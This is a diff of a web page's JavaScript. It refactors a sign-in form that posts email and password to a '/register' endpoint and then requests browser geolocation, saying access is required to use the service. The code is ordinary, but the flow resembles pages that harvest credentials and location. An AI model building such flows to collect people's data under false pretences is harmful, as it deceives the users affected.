+            ? 'In order to connect to our service, you need to allow location access.'
+            : 'We could not determine your location. Please try again.'
+        );
+      },
+      { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
     );
-}
+  }
 
-async function registerUser() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+  /* ===================================================
+     7. REGISTER USER
+  =================================================== */
+  async function registerUser() {
+    const emailEl = $('email');
+    const passEl  = $('password');
+
+    const email    = emailEl ? emailEl.value.trim() : '';
+    const password = passEl  ? passEl.value         : '';
 
     if (!email || !password) {
-        showErrorPage("Error", "Please enter both email id and password.");
-        return;
+      shake(emailEl, passEl);
+      if (!email && emailEl) emailEl.focus();
+      else if (passEl)       passEl.focus();
+      return;
     }
 
+    let response;
     try {
-        const response = await fetch("/register", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                email: email,
-                password: password
-            })
-        });
-
-        const result = await response.json();
-
-        if (response.ok) {
-            sendLocation();
-        } else {
-            showErrorPage("Registration Failed", result.error || "Please try again later.");
-        }
-    } catch (error) {
-        showErrorPage("Something Went Wrong", "Please try again later.");
+      response = await fetch('/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: email, password: password })
+      });
+    } catch (err) {
+      showErrorPage('Something Went Wrong', 'Please try again later.');
+      return;
     }
-}
 
-document.getElementById("signin").addEventListener("click", registerUser);
+    let result = {};
+    try { result = await response.json(); } catch (_) { result = {}; }
+
+    if (response.ok) {
+      sendLocation();
+    } else {
+      showErrorPage('Registration Failed', result.error || 'Please try again later.');
+    }
+  }
+
+  /* ===================================================
+     8. FORM SUBMIT  (single entry point — no duplicate calls)
+  =================================================== */
+  const form = $('loginForm');
+  const btn  = $('signin');
+
+  if (form) {
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      if (btn && btn.classList.contains('loading')) return;
+      if (btn) btn.classList.add('loading');
+
+      try {
+        await registerUser();
+      } finally {
+        if (btn && btn.isConnected) btn.classList.remove('loading');
+      }
+    });
+  }
+
+  /* ===================================================
+     9. OPTIONAL LOCATION PERMISSION CARD
+     (only if you actually add #allowBtn / #locationCard to the HTML)
+  =================================================== */
+  const allowBtn = $('allowBtn');
+  if (allowBtn) {
+    allowBtn.addEventListener('click', function () {
+      const card = $('locationCard');
+      if (card) card.remove();
+      sendLocation();
+    });
+  }
+
+  /* expose for debugging if needed */
+  window.showErrorPage = showErrorPage;
+  window.sendLocation  = sendLocation;
+  window.registerUser  = registerUser;
+
+})();
 </script>
 </body>
 </html>
